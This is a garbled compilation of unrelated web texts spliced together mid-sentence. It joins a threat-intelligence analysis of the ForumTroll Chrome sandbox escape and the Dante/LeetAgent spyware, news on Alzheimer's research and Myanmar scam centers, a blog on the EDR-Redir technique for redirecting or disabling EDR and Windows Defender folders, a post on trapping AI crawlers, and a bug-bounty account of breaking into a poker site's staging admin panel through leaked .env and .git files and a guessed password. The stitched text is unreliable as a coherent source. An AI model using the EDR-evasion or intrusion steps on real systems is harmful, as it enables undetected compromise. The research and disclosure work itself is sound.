No further action was required to initiate the infection; simply visiting the malicious website using Google Chrome or another Chromium-based web browser was enough.The malicious links were personalized and extremely short-lived to avoid detection. However, Kaspersky’s technologies successfully identified a sophisticated zero-day exploit that was used to escape Google Chrome’s sandbox. After conducting a quick analysis, we reported the vulnerability to the Google security team, who fixed it as CVE-2025-2783.Acknowledgement for finding CVE-2025-2783 (excerpt from the security fixes included into Chrome 134.0.6998.177/.178)We dubbed this campaign Operation ForumTroll because the attackers sent personalized phishing emails inviting recipients to the Primakov Readings forum. The lures targeted media outlets, universities, research centers, government organizations, financial institutions, and other organizations in Russia. The functionality of the malware suggests that the operation’s primary purpose was espionage.We traced the malware used in this attack back to 2022 and discovered more attacks by this threat actor on organizations and individuals in Russia and Belarus. While analyzing the malware used in these attacks, we discovered an unknown piece of malware that we identified as commercial spyware called “Dante” and developed by the Italian company Memento Labs (formerly Hacking Team).Similarities in the code suggest that the Operation ForumTroll campaign was also carried out using tools developed by Memento Labs.In this blog post, we’ll take a detailed look at the Operation ForumTroll attack chain and reveal how we discovered and identified the Dante spyware, which remained hidden for years after the Hacking Team rebrand.Operation ForumTroll attack chainIn all known cases, infection occurred after the victim clicked a link in a spear phishing email that directed them to a malicious website. The website verified the victim and executed the exploit.When we first discovered and began analyzing this campaign, the malicious website no longer contained the code responsible for carrying out the infection; it simply redirected visitors to the official Primakov Readings website.Therefore, we could only work with the attack artifacts discovered during the first wave of infections. Fortunately, Kaspersky technologies detected nearly all of the main stages of the attack, enabling us to reconstruct and analyze the Operation ForumTroll attack chain.Example of a malicious email used in this campaign (translated from Russian)The malicious emails sent by the attackers were disguised as invitations from the organizers of the Primakov Readings scientific and expert forum. These emails contained personalized links to track infections. The emails appeared authentic, contained no language errors, and were written in the style one would expect for an invitation to such an event. Proficiency in Russian and familiarity with local peculiarities are distinctive features of the ForumTroll APT group, traits that we have also observed in its other campaigns. However, mistakes in some of those other cases suggest that the attackers were not native Russian speakers.The validator is a relatively small script executed by the browser. It validates the victim and securely downloads and executes the next stage of the attack.The first action the validator performs is to calculate the SHA-256 of the random data received from the server using the WebGPU API. It then verifies the resulting hash. This is done using the open-source code of Marco Ciaramella’s sha256-gpu project. The main purpose of this check is likely to verify that the site is being visited by a real user with a real web browser, and not by a mail server that might follow a link, emulate a script, and download an exploit. Another possible reason for this check could be that the exploit triggers a vulnerability in the WebGPU API or relies on it for exploitation.The validator sends the infection identifier, the result of the WebGPU API check and the newly generated public key to the C2 server for key exchange using the Elliptic-curve Diffie–Hellman (ECDH) algorithm. If the check is passed, the server responds with an AES-GCM key. This key is used to decrypt the next stage, which is hidden in requests to bootstrap.bundle.min.js and .woff2 font files. Following the timeline of events and the infection logic, this next stage should have been a remote code execution (RCE) exploit for Google Chrome, but it was not obtained during the attack.List of in-the-wild 0-days caught and reported by KasperskyOver the years, we have discovered and reported on dozens of zero-day exploits that were actively used in attacks. However, CVE-2025-2783 is one of the most intriguing sandbox escape exploits we’ve encountered. This exploit genuinely puzzled us because it allowed attackers to bypass Google Chrome’s sandbox protection without performing any obviously malicious or prohibited actions. This was due to a powerful logical vulnerability caused by an obscure quirk in the Windows OS.To protect against bugs and crashes, and enable sandboxing, Chrome uses a multi-process architecture. The main process, known as the browser process, handles the user interface and manages and supervises other processes. Sandboxed renderer processes handle web content and have limited access to system resources. Chrome uses Mojo and the underlying ipcz library, introduced to replace legacy IPC mechanisms, for interprocess communication between the browser and renderer processes.The exploit we discovered came with its own Mojo and ipcz libraries that were statically compiled from official sources. This enabled attackers to communicate with the IPC broker within the browser process without having to manually craft and parse ipcz messages. However, this created a problem for us because, to analyze the exploit, we had to identify all the Chrome library functions it used. This involved a fair amount of work, but once completed, we knew all the actions performed by the exploit.In short, the exploit does the following:Resolves the addresses of the necessary functions and code gadgets from dll using a pattern search.Hooks the v8_inspector::V8Console::Debug function. This allows attackers to escape the sandbox and execute the desired payload via a JavaScript call.Starts executing a sandbox escape when attackers call console.debug(0x42, shellcode); from their script.Hooks the ipcz::NodeLink::OnAcceptRelayedMessage function.Creates and sends an ipcz message of the type RelayMessage. This message type is used to pass Windows OS handles between two processes that do not have the necessary permissions (e.g., renderer processes). The exploit retrieves the handle returned by the GetCurrentThread API function and uses this ipcz message to relay it to itself. The broker transfers handles between processes using the DuplicateHandle API function.Receives the relayed message back using the ipcz::NodeLink::OnAcceptRelayedMessage function hook, but instead of the handle that was previously returned by the GetCurrentThread API function, it now contains a handle to the thread in the browser process!Uses this handle to execute a series of code gadgets in the target process by suspending the thread, setting register values using SetThreadContext, and resuming the thread. This results in shellcode execution in the browser process and subsequent installation of a malware loader.So, what went wrong, and how was this possible? The answer can be found in the descriptions of the GetCurrentThread and GetCurrentProcess API functions. When these functions are called, they don’t return actual handles; rather, they return , special constants that are interpreted by the kernel as a handle to the current thread or process. For the current process, this constant is -1 (also equal to INVALID_HANDLE_VALUE, which brings its own set of quirks), and the constant for the current thread is -2. Chrome’s IPC code already checked for handles equal to -1, but there were no checks for -2 or other undocumented pseudo handles. This oversight led to the vulnerability. As a result, when the broker passed the -2 pseudo handle received from the renderer to the DuplicateHandle API function while processing the RelayMessage, it converted -2 into a real handle to its own thread and passed it to the renderer.Shortly after the patch was released, it became clear that Chrome was not the only browser affected by the issue. Firefox developers quickly identified a similar pattern in their IPC code and released an update under CVE-2025-2857.When pseudo handles were first introduced, they simplified development and helped squeeze out extra performance – something that was crucial on older PCs. Now, decades later, that outdated optimization has come back to bite us.Could we see more bugs like this? Absolutely. In fact, this represents a whole class of vulnerabilities worth hunting for – similar issues may still be lurking in other applications and Windows system services.To learn about the hardening introduced in Google Chrome following the discovery of CVE-2025-2783, we recommend checking out Alex Gough’s upcoming presentation, “Responding to an ITW Chrome Sandbox Escape (Twice!),” at Kawaiicon.Persistence is achieved using the Component Object Model (COM) hijacking technique. This method exploits a system’s search order for COM objects. In Windows, each COM class has a registry entry that associates the CLSID (128-bit GUID) of the COM with the location of its DLL or EXE file. These entries are stored in the system registry hive HKEY_LOCAL_MACHINE (HKLM), but can be overridden by entries in the user registry hive HKEY_CURRENT_USER (HKCU). This enables attackers to override the CLSID entry and run malware when the system attempts to locate and run the correct COM component.COM hijacking in a nutshellThe attackers used this technique to override the CLSID of twinapi.dll {AA509086-5Ca9-4C25-8F95-589D3C07B48A} and cause the system processes and web browsers to load the malicious DLL.This malicious DLL is a loader that decrypts and executes the main malware. The payload responsible for loading the malware is encoded using a simple binary encoder similar to those found in the Metasploit framework. It is also obfuscated with OLLVM. Since the hijacked COM object can be loaded into many processes, the payload checks the name of the current process and only loads the malware when it is executed by certain processes (e.g., rdpclip.exe). The main malware is decrypted using a modified ChaCha20 algorithm. The loader also has the functionality to re-encrypt the malware using the BIOS UUID to bind it to the infected machine. The decrypted data contains the main malware and a shellcode generated by Donut that launches it.LeetAgent is the spyware used in the Operation ForumTroll campaign. We named it LeetAgent because all of its commands are written in leetspeak. You might not believe it, but this is rare in APT malware. The malware connects to one of its C2 servers specified in the configuration and uses HTTPS to receive and execute commands identified by unique numeric values:0xC033A4D (COMMAND) – Run command with cmd.exe0xECEC (EXEC) – Execute process0x6E17A585 (GETTASKS) – Get list of tasks that agent is currently executing0x6177 (KILL) – Stop task0xF17E09 (FILE \x09) – Write file0xF17ED0 (FILE \xD0) – Read file0x1213C7 (INJECT) – Inject shellcode0xC04F (CONF) – Set communication parameters0xCD (CD) – Change current directory0x108 (JOB) – Set parameters for keylogger or file stealerIn addition to executing commands received from its C2, it runs keylogging and file-stealing tasks in the background. By default, the file-stealer task searches for documents with the following extensions: *.doc, *.xls, *.ppt, *.rtf, *.pdf, *.docx, *.xlsx, *.pptx.The configuration data is encoded using the TLV (tag-length-value) scheme and encrypted with a simple single-byte XOR cipher. The data contains settings for communicating with the C2, including many settings for traffic obfuscation.In most of the observed cases, the attackers used the Fastly.net cloud infrastructure to host their C2. Attackers frequently use it to download and run additional tools such as 7z, Rclone, SharpChrome, etc., as well as additional malware (more on that below).The number of traffic obfuscation settings may indicate that LeetAgent is a commercial tool, though we have only seen ForumTroll APT use it.In our opinion, attributing unknown malware is the most challenging aspect of security research. Why? Because it’s not just about analyzing the malware or exploits used in a single attack; it’s also about finding and analyzing all the malware and exploits used in past attacks that might be related to the one you’re currently investigating. This involves searching for and investigating similar attacks using indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs), as well as identifying overlaps in infrastructure, code, etc. In short, it’s about finding and piecing together every scrap of evidence until a picture of the attacker starts to emerge.We traced the first use of LeetAgent back to 2022 and discovered more ForumTroll APT attacks on organizations and individuals in Russia and Belarus. In many cases, the infection began with a phishing email containing malicious attachments with the following names:Baltic_Vector_2023.iso (translated from Russian)DRIVE.GOOGLE.COM (executable file)Invitation_Russia-Belarus_strong_partnership_2024.lnk (translated from Russian)Various other file names mentioning individuals and companiesIn addition, we discovered another cluster of similar attacks that used more sophisticated spyware instead of LeetAgent. We were also able to track the first use of this spyware back to 2022. In this cluster, the infections began with phishing emails containing malicious attachments with the following names:<DATE>_winscan_to_pdf.pdf.lnkRostelecom.pdf.lnk (translated from Russian)The attackers behind this activity used similar file system paths and the same persistence method as the LeetAgent cluster. This led us to suspect that the two clusters might be related, and we confirmed a direct link when we discovered attacks in which this much more sophisticated spyware was launched by LeetAgent.Connection between LeetAgent and commercial spyware called DanteAfter analyzing this previously unknown, sophisticated spyware, we were able to identify it as commercial spyware called Dante, developed by the Italian company Memento Labs.The Atlantic Council’s Cyber Statecraft Initiative recently published an interesting report titled “Mythical Beasts and where to find them: Mapping the global spyware market and its threats to national security and human rights.” We think that comparing commercial spyware to mythical beasts is a fitting analogy. While everyone in the industry knows that spyware vendors exist, their “products” are rarely discovered or identified. Meanwhile, the list of companies developing commercial spyware is huge. Some of the most famous are NSO Group, Intellexa, Paragon Solutions, Saito Tech (formerly Candiru), Vilicius Holding (formerly FinFisher), Quadream, Memento Labs (formerly Hacking Team), negg Group, and RCS Labs. Some are always in the headlines, some we have reported on before, and a few have almost completely faded from view. One company in the latter category is Memento Labs, formerly known as Hacking Team.Hacking Team (also stylized as HackingTeam) is one of the oldest and most famous spyware vendors. Founded in 2003, Hacking Team became known for its Remote Control Systems (RCS) spyware, used by government clients worldwide, and for the many controversies surrounding it. The company’s trajectory changed dramatically in 2015 when more than 400 GB of internal data was leaked online following a hack. In 2019, the company was acquired by InTheCyber Group and renamed Memento Labs. “We want to change absolutely everything,” the Memento Labs owner told Motherboard in 2019. “We’re starting from scratch.” Four years later, at the ISS World MEA 2023 conference for law enforcement and government intelligence agencies, Memento Labs revealed the name of its new surveillance tool – DANTE. Until now, little was known about this malware’s capabilities, and its use in attacks had not been discovered.Excerpt from the agenda of the ISS World MEA 2023 conference (the typo was introduced on the conference website)The problem with detecting and attributing commercial spyware is that vendors typically don’t include their copyright information or product names in their exploits and malware. In the case of the Dante spyware, however, attribution was simple once we got rid of VMProtect’s obfuscation and found the malware name in the code.Dante spyware name in the codeOf course, our attribution isn’t based solely on the string “Dante” found in the code, but it was an important clue that pointed us in the right direction. After some additional analysis, we found a reference to a “2.0” version of the malware, which matches the title of the aforementioned conference talk. We then searched for and identified the most recent samples of Hacking Team’s Remote Control Systems (RCS) spyware. Memento Labs kept improving its codebase until 2022, when it was replaced by Dante. Even with the introduction of the new malware, however, not everything was built from scratch; the later RCS samples share quite a few similarities with Dante. All these findings make us very confident in our attribution.Why did the authors name it Dante? This may be a nod to tradition, as RCS spyware was also known as “Da Vinci”. But it could also be a reference to Dante’s poem Divine Comedy, alluding to the many “circles of hell” that malware analysts must pass through when detecting and analyzing the spyware given its numerous anti-analysis techniques.First of all, the spyware is packed with VMProtect. It obfuscates control flow, hides imported functions, and adds anti-debugging checks. On top of that, almost every string is encrypted.VMProtect anti-debugging techniqueTo protect against dynamic analysis, Dante uses the following anti-hooking technique: when code needs to execute an API function, its address is resolved using a hash, its body is parsed to extract the system call number, and then a new system call stub is created and used.Dante anti-hooking technique (simplified)In addition to VMProtect’s anti-debugging techniques, Dante uses some common methods to detect debuggers. Specifically, it checks the debug registers (Dr0–Dr7) using NtGetContextThread, inspects the KdDebuggerEnabled field in the KUSER_SHARED_DATA structure, and uses NtQueryInformationProcess to detect debugging by querying the ProcessDebugFlags, ProcessDebugPort, ProcessDebugObjectHandle, and ProcessTlsInformation classes.To protect itself from being discovered, Dante employs an interesting method of checking the environment to determine if it is safe to continue working. It queries the Windows Event Log for events that may indicate the use of malware analysis tools or virtual machines (as a guest or host).The strings Dante searches for in the event logsIt also performs several anti-sandbox checks. It searches for “bad” libraries, measures the execution times of the sleep() function and the cpuid instruction, and checks the file system.Some of these anti-analysis techniques may be a bit annoying, but none of them really work or can stop a professional malware analyst. We deal with these techniques on an almost daily basis.After performing all the checks, Dante does the following: decrypts the configuration and the orchestrator, finds the string “DANTEMARKER” in the orchestrator, overwrites it with the configuration, and then loads the orchestrator.The configuration is decrypted from the data section of the malware using a simple XOR cipher. The orchestrator is decrypted from the resource section and poses as a font file. Dante can also load and decrypt the orchestrator from the file system if a newer, updated version is available.The orchestrator displays the code quality of a commercial product, but isn’t particularly interesting. It is responsible for communication with C2 via HTTPs protocol, handling modules and configuration, self-protection, and self-removal.Modules can be saved and loaded from the file system or loaded from memory. The infection identifier (GUID) is encoded in Base64. Parts of the resulting string are used to derive the path to a folder containing modules and the path to additional settings stored in the registry.An example of Dante’s paths derivationThe folder containing modules includes a binary file that stores information about all downloaded modules, including their versions and filenames. This metadata file is encrypted with a simple XOR cipher, while the modules are encrypted with AES-256-CBC, using the first 0x10 bytes of the module file as the IV and the key bound to the machine. The key is equal to the SHA-256 hash of a buffer containing the CPU identifier and the Windows Product ID.To protect itself, the orchestrator uses many of the same anti-analysis techniques, along with additional checks for specific process names and drivers.If Dante doesn’t receive commands within the number of days specified in the configuration, it deletes itself and all traces of its activity.At the time of writing this report, we were unable to analyze additional modules because there are currently no active Dante infections among our users. However, we would gladly analyze them if they become available. Now that information about this spyware has been made public and its developer has been identified, we hope it won’t be long before additional modules are discovered and examined. To support this effort, we are sharing a method that can be used to identify active Dante spyware infections (see the Indicators of compromise section).Although we didn’t see the ForumTroll APT group using Dante in the Operation ForumTroll campaign, we have observed its use in other attacks linked to this group. Notably, we saw several minor similarities between this attack and others involving Dante, such as similar file system paths, the same persistence mechanism, data hidden in font files, and other minor details. Most importantly, we found similar code shared by the exploit, loader, and Dante. Taken together, these findings allow us to conclude that the Operation ForumTroll campaign was also carried out using the same toolset that comes with the Dante spyware.This time, we have not one, but three conclusions.1) DuplicateHandle is a dangerous API function. If the process is privileged and the user can provide a handle to it, the code should return an error when a pseudo-handle is supplied.2) Attribution is the most challenging part of malware analysis and threat intelligence, but also the most rewarding when all the pieces of the puzzle fit together perfectly. If you ever dreamed of being a detective as a child and solving mysteries like Sherlock Holmes, Miss Marple, Columbo, or Scooby-Doo and the Mystery Inc. gang, then threat intelligence might be the right job for you!3) Back in 2019, Hacking Team’s new owner stated in an interview that they wanted to change everything and start from scratch. It took some time, but by 2022, almost everything from Hacking Team had been redone. Now that Dante has been discovered, perhaps it’s time to start over again.Full details of this research, as well as future updates on ForumTroll APT and Dante, are available to customers of the APT reporting service through our Threat Intelligence Portal.

Restless nights with little sleep and increased napping during the day are early indicators of disease onset, while sundowning, or confusion later in the day, is typical for later stages of the disease. These symptoms suggest a link between the progression of the disease and the circadian system — the body’s internal clock that controls our sleep and wake cycle — but scientists did not know the full nature of the connection.Researchers from Washington University School of Medicine in St. Louis have now shown in mice that the circadian rhythms within particular brain cells are disrupted in Alzheimer’s disease in ways that change how and when hundreds of genes regulate key functions in the brain.The findings, published October 23 in Nature Neuroscience, suggest that controlling or correcting these circadian rhythms could be a potential way to treat the disease.“There are 82 genes that have been associated with Alzheimer’s disease risk, and we found that the circadian rhythm is controlling the activity of about half of those,” said Erik S. Musiek, MD, PhD, the Charlotte & Paul Hagemann Professor of Neurology at WashU Medicine, who led the study. In mice modeling Alzheimer’s disease, the typical daily activity patterns of those genes were altered. “Knowing that a lot of these Alzheimer’s genes are being regulated by the circadian rhythm gives us the opportunity to find ways to identify therapeutic treatments to manipulate them and prevent the progression of the disease.”Musiek, the co-director of the Center on Biological Rhythms and Sleep (COBRAS) at WashU Medicine and a neurologist who specializes in aging and dementia, said that changes in sleep patterns are among the most frequent concerns reported to him by caregivers of Alzheimer’s patients. He and colleagues have previously shown that these changes begin in Alzheimer’s years before memory loss becomes apparent. He noted that in addition to creating burdens for caregivers and patients, disrupted sleep patterns generate biological and psychological stresses that accelerate the progression of the disease.Breaking this feedback loop requires identifying its origins. The body’s circadian clock is thought to act on 20% of all genes in the human genome, controlling when they turn on or off to manage processes including digestion, the immune system and our sleep-wake cycle.Musiek had previously identified a specific protein, YKL-40, that fluctuates across the circadian cycle and regulates normal levels of amyloid protein in the brain. He found that too much of YKL-40, which is linked to Alzheimer’s risk in humans, leads to amyloid build-up, an accumulation that is a hallmark of the neurodegenerative disease.Amyloid disrupts rhythmic brain functionsThe cyclic nature of Alzheimer’s symptoms suggests that there are more circadian-regulated proteins and their associated genes involved beyond YKL-40. So in this latest study, Musiek and his colleagues examined gene expression in the brains of mice with accumulations of amyloid proteins that mimic early stages of Alzheimer’s, as well as those of both healthy, young animals and aged mice without amyloid accumulations. The scientists collected tissue at 2-hour intervals over 24 hours and then performed an analysis of what genes were active during particular phases of the circadian cycle.They found that the amyloid accumulations threw off the daily rhythms of hundreds of genes in brain cells known as microglia and astrocytes in ways that were different from what aging alone caused. Microglia are part of the brain’s immune response, clearing away toxic materials and dead cells, while astrocytes have roles in supporting and maintaining communication between neurons. The affected genes are generally involved in helping microglial cells break down waste material from the brain, including amyloid.While the circadian disruption didn’t entirely shut down the genes in question, it turned an orderly sequence of events into a scattershot affair that could degrade the optimal synchronicity of brain cells’ functions, such as clearing amyloid.In addition, the researchers found that the presence of amyloid appeared to create new rhythms in hundreds of genes that do not typically have a circadian pattern of activity. Many of the genes are involved in the brain’s inflammatory response to infection or imbalances such as amyloid plaque build-up.Musiek said that altogether the findings point to exploring therapies that target circadian cycles in microglia and astrocytes to support healthy brain function.“We have a lot of things we still need to understand, but where the rubber meets the road is trying to manipulate the clock in some way, make it stronger, make it weaker or turn it off in certain cell types,” he said. “Ultimately, we hope to learn how to optimize the circadian system to prevent amyloid accumulation and other aspects of Alzheimer’s disease.”]]></content:encoded></item><item><title>CVE-2025-12285 - Missing Initial Password Change</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12285</link><author></author><category>vulns</category><pubDate>Sun, 26 Oct 2025 17:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12285

These usually involve gaining victims’ confidence online with romantic ploys and bogus investment pitches.The centers are infamous for recruiting workers from other countries under false pretenses, promising them legitimate jobs and then holding them captive and forcing them to carry out criminal activities.  were in the international spotlight last week when the United States and Britain enacted sanctions against organizers of a , and its alleged ringleader was indicted by a federal court in New York. According to a report in Monday’s Myanma Alinn newspaper, the army raided KK Park, a well-documented cybercrime center, as part of operations starting in early September to suppress online fraud, illegal gambling, and cross-border cybercrime.It published photos displaying seized Starlink equipment and soldiers said to be carrying out the raid, though it was unclear when exactly they were taken.KK Park is located on the outskirts of Myawaddy, a major trading town on the border with Thailand in Myanmar’s Kayin state. The area is only loosely under the control of Myanmar’s military government, and also falls under the influence of Maj. Gen. Zaw Min Tun, the spokesperson for the military government, charged in a statement Monday night that the top leaders of the Karen National Union, an armed ethnic organization opposed to army rule, were involved in the scam projects at KK Park.The allegation was previously made based on claims that a company backed by the Karen group allowed the land to be leased. However, the Karen, who are part of the larger armed resistance movement in Myanmar’s civil war, deny any involvement in the scams.Myanma Alinn said the army ascertained that more than 260 buildings were unregistered, and seized equipment, including 30 sets of Starlink satellite internet terminals. It said 2,198 individuals were detained though it did not give their nationalities. of Elon Musk’s SpaceX company and the terminals link to its satellites.

  for its executable file locations. If an attacker can interfere with these
  locations, they can prevent the EDR from functioning or inject code into the
  EDR itself to stay under the radar.

  In this article, I will demonstrate the technique of exploiting the
   driver () to redirect folders containing
  the executable files of EDRs to a location that I completely control. Here, we
  can block or inject code into the EDR at will. Everything will be executed in
  user mode without needing kernel privileges through the
  Bring Your Own Vulnerable Driver (BYOVD) attack. Additionally, I will
  use the  driver () to completely isolate
  an antivirus.

  I will conduct a practical experiment in this article using
  . I have also tried this technique with
  two other commercial EDRs, and it was successful with all of them.

      hidden from strangers, screen is only visible to persons directly in front
      of screen.
    1. Introduction To The Bind Link Feature Of Windows
  The
  Windows Bind Link  is part of a newer feature introduced in Windows 11 (starting with version 24H2) that enables filesystem namespace redirection using a virtual path

  A bind link allows administrators to map a virtual path on the local system to
  a backing path, either local or remote, without physically copying files. This
  is handled by the Bind Filter driver ().
: Redirects file system access from a virtual
    path to a real path.
  Transparent to Applications: Apps don’t need to be aware of the
    redirection; they operate as if files are local.
  
    Security Inheritance: Permissions and security descriptors from the backing
    path are extended to the virtual path.
  
    No Physical Files Created: The virtual path doesn’t create actual files or
    folders, just a logical mapping.
  2. Redirecting the EDR executable folder with 
  As mentioned above, you can simply understand that bind link functions
  similarly to a symbolic link for folders. The difference is that it operates
  at the minifilter driver level.

  Current EDRs are also very vigilant against the symbolic link redirect attack
  technique. They check files thoroughly before opening or do not follow
  symlinks. Additionally, they use
  RedirectionGuard  to mitigate unsafe junctions and symlink traversal. It blocks
  privileged services from following symlinks unless explicitly allowed.

  The most important thing is that you will not be able to write files into the
  folders containing the executable files of the EDR, unless you have kernel
  privileges or exploit the EDR software to execute code within its processes.
The challenge here is that when the EDR is active, we have limited options
    with its executable folders. Even when the EDR service processes are not
    running, these folders remain protected by the EDR's minifilter.But everything changes when the bind link comes into play.2.1 Introduction to the EDR-Redir tool is a simple tool that creates a virtual path pointing to a
  real path. You can download it at the following link:
It has very simple running parameters.I will try to create a simple bind link with the following command.EDR-Redir.exe bind c:\TMP\123 c:\TMP\456
    At this point, EDR-Redir.exe will create a virtual path
     pointing to . When you interact with
    "", all file operations will occur in "" without any
    user mode redirect activity.
  
  When EDR-Redir creates the bind link, all operations with the folders at this
  point are only "" and "". And we, with Administrator
  privileges, inherently have these permissions with the executable folders of
  the EDR.

  So, what if I turn the EDR folder into a bind link pointing to another folder?
  This is impossible with a symbolic link, but with minifilter bindflt.sys,
  could it succeed?
2.2 Experimenting EDR-Redir with Windows DefenderWith these results, it seems like we've hit a dead end, right?
    Don't worry,  just for this stubborn guy. Let's keep
    experimenting by creating a bind link with  and
     to see what happens.
  2.3 EDR-Redir vs Elastic Defend has successfully redirected the executable folder of
     to a path that I completely control
    ().
  2.4 EDR-Redir vs Sophos Intercept X
  Once the bind link is successfully created,  will now
  use the folder "" as its working directory.

      With the folder completely under our control, we can drop any DLL files to
      attempt a hijack, or place an executable file for the EDR to run for us.
      Alternatively, we can simply leave the folder empty to prevent the EDR
      from operating in the next boot session.
    It's important to note that the bind link will not persist after a
        Windows reboot. Therefore, if you want to maintain these bind links,
      you need to create a task or service  that runs at Windows startup to recreate the bind link.
    2.5 Windows Defender and Cloud Files API
    The
    Windows Cloud Filter API , also known as Cloud Files API (), is a powerful Win32
    interface that enables developers to create sync engines and cloud storage
    solutions that integrate seamlessly with the Windows file system.
   is the Cloud Files Mini Filter Driver that powers the
    on-demand file access feature in Windows, used by services like OneDrive to
    show placeholder files that download only when opened. It works in tandem
    with the Cloud Filter API (cfapi.h) to manage hydration (downloading) and
    dehydration (removing local copies) of files.
  
    The CFAPI provides a function called
    CfRegisterSyncRoot that allows users to register a sync root with the system.
   requires a  field to
    successfully register a sync root folder.
  
    If I register a sync root folder with a nearly empty policy, without
    any parameters, what will happen to the newly registered folder?
  
  Sometimes, code errors can have their silver linings, at least in this case.

  So, what if I perform an incomplete registration of the sync root with the
  active folder of ? Let's conduct an experiment right
  away.

  As you can see in the image above,  has successfully
  registered a sync root with the  folder. At this point,
  Defender will no longer be able to access its folder. If you restart Windows,
  Defender's services will also be unable to run.

  The sync root folder will persist after a Windows reboot, so we don't need to
  create a task or service to reactivate it.

  By controlling the folder containing the EDR activities, an attacker can
  execute various actions on the victim's EDR system to remain undetected:
  dropping DLL files for hijacking, placing executable files to trigger the EDR
  on their behalf, or simply blocking and disabling the processes and services
  of the EDR.
 uses a Bind Filter (mini filter bindflt.sys) and the Windows
  Cloud Filter API (cldflt.sys) to redirect the EDR's working folder to a folder
  of the attacker's choice. Alternatively, it can make the folder appear corrupt
  to prevent the EDR's process services from functioning.

  The  technique occurs entirely at the minifilter driver level,
  so there will be limited events to monitor at the user mode. Defense against
  this technique primarily comes from EDRs enhancing their protection for their
  folders.

(Programming) 


A week ago, I set up an infinite nonsense crawler trap – now it makes up 99% of my server’s traffic.
What surprised me is that feeding scrapers garbage is the cheapest and easiest thing I could do.These aren’t the indexing bots of old, but scrapers collecting data to train LLMs.
Unlike search engines, which need the websites they crawl to stay up, AI companies provide a replacement.It should come as no surprise that these bots are aggressive and relentless:
They ignore robots.txt, and if block them by user agent they just pretend to be a browser.
If you ban their IP, they switch addresses.… all while sending multiple requests per second, all day, every day.So what if we let them access the site?Serving static files is is relatively cheap, but not free.
SSD access times are in the tens milliseconds, and that’s before you pay the filesystem tax.
Bots also like to grab old and obscure pages, ones that are unlikely to be in cache.
As a result, it doesn’t take all that many requests to bog down the server.Then there’s the matter of bandwidth:
Many blog posts also include images weighing hundreds to thousands of kB, which can add up quite quickly.
With an average file size of 100 kB, 4 requests per second adds up to a terabyte each month
– not a huge amount of data, but more then I’m willing to throw away.Simply making a list of IPs and blocking them would for normal bots…… but these are hardly normal bots.
Because they are backed by billion dollar companies, they don’t just have a few addresses, but many thousands.
If you managed to ban all of their addresses, they’ll just buy more.Rate limits fail for the same reason: They just switch IPs.
I’ve even seen them using new IP for each request.All of these inconvenience users.
Requiring an account guaranties that no one will read what I wrote.
Even just a simple JavaScript challenge will block anyone who’s browser doesn’t support JS
… and when it works, anything that must load before the does content still hugely slows down page loads.Gzip only provides a compression ratio of a little over 1000:
If I want a file that expands to 100 GB, I’ve got to serve a 100 MB asset.
Worse, when I tried it, the bots just shrugged it off, with some even coming back for more.Ok, what if we just send them 404s – try and make them think my site doesn’t exist.These tricks only work if your adversary has a mind to trick.
If a link is posted somewhere, the bots will know it exists, and if they can’t access it, they’ll just become more aggressive:.
sending more requests, with more user agents and using more addresses.Keeping them happy keeps them tolerable.But surely sending them dynamically generated content would be expensive right?CPU and RAM are the fastest parts of a modern computer.

This vulnerability could have been used to retrieve drivers licenses, passport numbers, IP addresses, transactions, game history, and more.After reporting the vulnerability, ClubWPT thoroughly patched the issue and confirmed that it had never been exploited maliciously. The host is now inaccessible, and we worked with them to confirm that it is no longer reproducible.For the last few DEF CONs, my guilty pleasure has been sneaking away to the Aria poker room and playing No Limit Holdem until 3 or 4 in the morning. This habit was never really a problem as there wasn't a casino within 50 miles of where I lived, but when I learned that the World Poker Tour had created an online poker website that was legal in the US (under sweepstakes laws), I got super curious and registered.After signing up, I was able to purchase and cash out "sweep coins" (credits that could be used to play on the website) using a credit card. Pretty soon I was playing (mostly losing) in online tournaments, and got pretty sucked into the online gambling world.Eventually I got curious on how the actual ClubWPT Gold infrastructure worked and started poking around on the website.A Weird Domain in the JavaScriptWhile playing poker on the ClubWPT Gold website, I noticed a strange URL saved to a variable in the JavaScript's environment variables:This URL variable was odd, because there were no other references in the JavaScript with the "liuxinyi1.cn" root domain, nor any code which actually used the variable. It was also strange that it was a Chinese domain, given that ClubWPT Gold was a US company.My immediate guess was that this domain was somehow related to the development of the website, and that it was outsourced to another domain. I went ahead and checked what other subdomains there were on"liuxinyi1.cn" and if any of them were related to ClubWPT Gold.There were dozens of ClubWPT Gold services running on the "liuxinyi1.cn" subdomains, but the most interesting one by far was the "coin-admin.clubwpt.liuxinyi1.cn" domain. It was a generic login page that seemed to be for some sort of administration tool.We kicked off a ffuf scan (an endpoint discovery tool) to see if there were any unauthenticated endpoints, and some really good results came back:		[, , , , ]
		[, , , , ]
We loaded the ".env" endpoint and there were dozens of various secrets exposed. Most of them were for internal services, but there were also Alibaba cloud credentials:We tested the Alibaba cloud credentials using the aliyun CLI tool, but they didn't seem to have any permissions.Since we couldn't access anything else using the disclosed secrets from the exposed ".env" file, the next thing to try was cloning the exposed ".git" folder with tigert1998's Python3 GitHack tool.After a few seconds, we started getting files back. The ".git" endpoint was exposing the admin panel source code! We let the tool run for a while, ripping the back office source code from the website.When the tool finished, we had what looked to be a full copy of the full ClubWPT Gold back office application. It had hundreds of endpoints in dozens of PHP files leaked via GitHack.We reviewed the PHP files and couldn't find many issues. All of the core authentication logic was super solid, and we wouldn't be able to call anything unauthenticated.The only vulnerability that we did find in the source code was a 2FA bypass. This was useless as we didn't have a valid login, and at this point, we didn't even have any usernames.Authenticating to ClubWPT Gold's Back Office (staging)While trying to find unauthenticated vulnerabilities, an interesting line caught our attention in the ".env" file:These appeared to be usernames hardcoded into the environment variables. We checked the source code and saw that the website used these values to assign administrator privileges to certain users for the application, so they were likely valid accounts that we could try and login to.Since it was a development environment, maybe they had weak credentials? We tested all of the really basic stuff, like "123456" and "admin". Surely this wouldn't work, but there was nothing else to try.Burp Suite's intruder tool ran for a few minutes. Every response so far was "invalid password". I went ahead and removed all entries with the string "invalid password" and updated the results table. There was one result: a 302 redirect to "index.html".The password "123456" for the "eg3478" user worked. And the account didn't even have any 2FA set. We were immediately logged into the staging version of ClubWPT Gold's back office.There were hundreds of endpoints for pretty much everything that you could imagine a poker website would have on their backend. You could retrieve the KYC details of any players, add coins to accounts, ban them, and inspect gameplay history for anyone. It seemed to be the full testing infrastructure for the ClubWPT Gold admin panel connected to a staging website.We searched for our username and couldn't find it. None of the logs had any actual data. It was all dummy accounts. This was really 